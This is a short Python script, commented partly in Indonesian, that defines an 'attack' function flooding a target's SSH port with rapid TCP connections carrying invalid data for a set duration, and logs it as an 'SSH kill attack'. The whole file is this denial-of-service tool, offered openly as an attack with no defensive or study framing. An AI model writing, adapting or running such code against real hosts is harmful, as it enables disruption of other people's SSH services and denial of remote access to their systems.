import socket
import time
import logging

log = logging.getLogger(__name__)

def attack(target, port=22, duration=60):
    start_time = time.time()
    end_time = start_time + duration
    connections_made = 0

    try:
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)  # Timeout singkat
                s.connect((target, port))
                # Kirim data yang tidak valid
                s.send(b"InvalidSSHData\r\n")
                connections_made += 1
                s.close()
            except socket.error as e:
                log.debug(f"Socket error: {e}")  # Debug, bukan error.
            except Exception as e:
                log.exception(f"An unexpected error occurred: {e}")
                break

    except KeyboardInterrupt:
        pass
    finally:
        log.info(f"SSH kill attack finished.  {connections_made} connections attempted.")